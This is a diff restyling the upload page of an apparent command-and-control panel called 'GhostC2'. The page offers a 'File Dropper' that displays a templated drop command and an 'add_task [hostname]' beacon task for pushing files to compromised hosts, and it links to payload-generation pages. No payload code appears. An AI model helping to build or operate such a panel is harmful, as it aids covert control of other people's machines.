@@ -3,75 +3,253 @@
 <head>
   <meta charset="UTF-8" />
   <title>Upload Payload</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
+    :root {
+      --accent: #22ff44;
+      --status-glow: 0 0 10px 2px #22ff4499;
+    }
     body {
-      background-color: #000;
-      color: #00ff00;
-      font-family: monospace;
-      padding: 2rem;
+      background: #111316;
+      color: #e3e3e3;
+      font-family: 'Inter', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      min-height: 100vh;
+    }
+    #sidebar {
+      width: 190px;
+      background: #181a1f;
+      border-right: 1.5px solid #222;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      position: fixed;
+      left: 0; top: 0;
+      z-index: 100;
+    }
+    #sidebar .logo {
+      font-size: 1.18em;
+      font-weight: 700;
+      padding: 30px 20px 36px 24px;
+      color: var(--accent);
+      letter-spacing: 0.04em;
+    }
+    #sidebar nav {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+    #sidebar a {
+      color: #dadada;
+      text-decoration: none;
+      padding: 13px 30px 13px 24px;
+      font-size: 1em;
+      border-left: 3px solid transparent;
+      font-weight: 500;
+      transition: background 0.12s, border-color 0.14s, color 0.15s;
+    }
+    #sidebar a.active {
+      border-left: 3px solid var(--accent);
+      color: var(--accent);
+      background: #16181d;
+    }
+    #sidebar a:hover {
+      background: #16181d;
+      color: var(--accent);
+    }
+    .theme-switcher {
+      margin: 16px 0 0 24px;
+    }
+    .theme-switcher button {
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      font-size: 1em;
+      margin-right: 7px;
+      color: #888;
+      transition: color 0.12s;
+    }
+    .theme-switcher button.active, .theme-switcher button:hover {
+      color: var(--accent);
+    }
+    #main {
+      margin-left: 190px;
+      padding: 32px 38px 32px 38px;
+      width: 100%;
+    }
+    a {
+      color: var(--accent);
+      text-decoration: underline;
+      display: inline-block;
+      margin-bottom: 16px;
+      font-size: 0.98em;
+    }
+    h1 {
+      font-size: 1.5em;
+      margin-bottom: 1.2em;
+      color: var(--accent);
+      letter-spacing: 0.02em;
+      font-weight: 700;
+    }
+    form {
+      margin-top: 1.7em;
+      background: #16181d;
+      padding: 2.1em 1.6em 2em 1.6em;
+      border-radius: 0;
+      box-shadow: 0 1px 8px 0 #000a;
+      max-width: 450px;
+      border: 1.5px solid #23262a;
     }
     input[type="file"] {
-      margin-bottom: 1rem;
+      margin-bottom: 1.2em;
+      background: #181a1f;
+      color: #e3e3e3;
+      font-size: 1em;
+      border: none;
     }
     button {
-      padding: 0.5rem 1rem;
-      background: #00ff00;
+      padding: 0.7em 1.6em;
+      background: var(--accent);
       border: none;
-      color: black;
+      color: #111;
       cursor: pointer;
       font-weight: bold;
+      font-size: 1.05em;
+      letter-spacing: 0.01em;
+      margin-top: 0.6em;
+      box-shadow: var(--status-glow);
+      border-radius: 0;
+      transition: background 0.16s, color 0.14s, box-shadow 0.1s;
+    }
+    button:hover {
+      background: #1bfc67;
+      color: #101312;
+      box-shadow: 0 0 13px 2px #81ffa833;
     }
     .output {
-      margin-top: 2rem;
-      white-space: pre-wrap;
-      background: #111;
-      padding: 1rem;
-      border: 1px solid #00ff00;
+      margin-top: 2.5em;
+      background: #16181d;
+      padding: 1.4em 1.2em;
+      border: 1.5px solid var(--accent);
+      color: #d8ffe5;
+      font-size: 1.07em;
+      font-family: 'JetBrains Mono', monospace;
+      border-radius: 0;
+      max-width: 600px;
+      box-shadow: 0 1px 8px 0 #000a;
+    }
+    .output code {
+      background: #181a1f;
+      color: var(--accent);
+      padding: 2px 7px;
+      border-radius: 0;
+      font-size: 1em;
+    }
+    .output button {
+      background: #181a1f;
+      color: var(--accent);
+      box-shadow: none;
+      border: 1.1px solid var(--accent);
+      margin-top: 0.5em;
+      margin-bottom: 1.2em;
+      padding: 0.42em 1.3em;
+      font-size: 0.98em;
+    }
+    .output button:hover {
+      background: #25272a;
+      color: #baffc9;
+      border-color: #baffc9;
+      box-shadow: 0 0 6px #81ffa833;
+    }
+    @media (max-width: 750px) {
+      #main { padding: 24px 8px; }
+      #sidebar { width: 100px; }
+      #main { margin-left: 100px; }
+      form, .output { max-width: 97vw; }
     }
   </style>
 </head>
 <body>
-  <a href="/">&larr; Back to Dashboard</a><br>
-  <h1>Upload File Dropper</h1>
-  <form method="POST" enctype="multipart/form-data">
-    <input type="file" name="file" required />
-    <br/>
-    <button type="submit">Upload</button>
-  </form>
+  <div id="sidebar">
+    <div class="logo">GhostC2</div>
+    <nav>
+      <a href="/">Dashboard</a>
+      <a href="/console">Live Console</a>
+      <a href="/generate">Generate Payload</a>
+      <a href="/upload" class="active">Upload</a>
+      <a href="/generate_ps_payload" target="_blank">PowerShell Payload</a>
+    </nav>
+    <div class="theme-switcher">
+      <button onclick="setTheme('green')" class="active">🟢</button>
+      <button onclick="setTheme('orange')">🟠</button>
+      <button onclick="setTheme('blue')">🔵</button>
+      <button onclick="setTheme('red')">🔴</button>
+    </div>
+  </div>
+  <div id="main">
+    <a href="/">&larr; Back to Dashboard</a>
+    <h1>Upload File Dropper</h1>
+    <form method="POST" enctype="multipart/form-data">
+      <input type="file" name="file" required />
+      <br/>
+      <button type="submit">Upload</button>
+    </form>
 
-  {% if success %}
-  <div class="output">
-    <p><strong>File uploaded:</strong> {{ filename }}</p>
-  
-    <p><strong>Drop Command:</strong></p>
-    <code id="dropCmd">{{ drop_cmd }}</code>
-    <br>
-    <button onclick="copyText('dropCmd')">Copy Drop Command</button>
-  
-    <br><br>
-  
-    <p><strong>Beacon Task Format:</strong></p>
-    <code id="beaconCmd">add_task [hostname] {{ drop_cmd }}</code>
-    <br>
-    <button onclick="copyText('beaconCmd')">Copy Beacon Task</button>
-  </div>  
-  {% endif %}
+    {% if success %}
+    <div class="output">
+      <p><strong>File uploaded:</strong> {{ filename }}</p>
 
+      <p><strong>Drop Command:</strong></p>
+      <code id="dropCmd">{{ drop_cmd }}</code>
+      <br>
+      <button onclick="copyText('dropCmd')">Copy Drop Command</button>
 
-    <script>
-    function copyText(id) {
-        const el = document.getElementById(id);
-        const range = document.createRange();
-        range.selectNodeContents(el);
-        const sel = window.getSelection();
-        sel.removeAllRanges();
-        sel.addRange(range);
-        document.execCommand("copy");
-        sel.removeAllRanges();
-        alert("Copied!");
+      <br><br>
+
+      <p><strong>Beacon Task Format:</strong></p>
+      <code id="beaconCmd">add_task [hostname] {{ drop_cmd }}</code>
+      <br>
+      <button onclick="copyText('beaconCmd')">Copy Beacon Task</button>
+    </div>  
+    {% endif %}
+  </div>
+
+  <script>
+    // Theme Switcher
+    function setTheme(theme) {
+      let vars = {
+        green:  ["#22ff44", "0 0 10px 2px #22ff4499"],
+        orange: ["#ff9a00", "0 0 10px 2px #ff9a0099"],
+        blue:   ["#0af",    "0 0 10px 2px #0af8"],
+        red:    ["#f33",    "0 0 10px 2px #f338"]
+      };
+      if(vars[theme]) {
+        document.documentElement.style.setProperty('--accent', vars[theme][0]);
+        document.documentElement.style.setProperty('--status-glow', vars[theme][1]);
+        localStorage.setItem("ghostc2-theme", theme);
+      }
+      // Set button active
+      document.querySelectorAll('.theme-switcher button').forEach(b=>b.classList.remove('active'));
+      document.querySelector('.theme-switcher button[onclick*="'+theme+'"]').classList.add('active');
     }
-    </script>
-    
+    window.onload = function() {
+      let saved = localStorage.getItem("ghostc2-theme");
+      if (saved) setTheme(saved);
+    };
 
+    function copyText(id) {
+      const el = document.getElementById(id);
+      const range = document.createRange();
+      range.selectNodeContents(el);
+      const sel = window.getSelection();
+      sel.removeAllRanges();
+      sel.addRange(range);
+      document.execCommand("copy");
+      sel.removeAllRanges();
+      alert("Copied!");
+    }
+  </script>
 </body>
 </html>
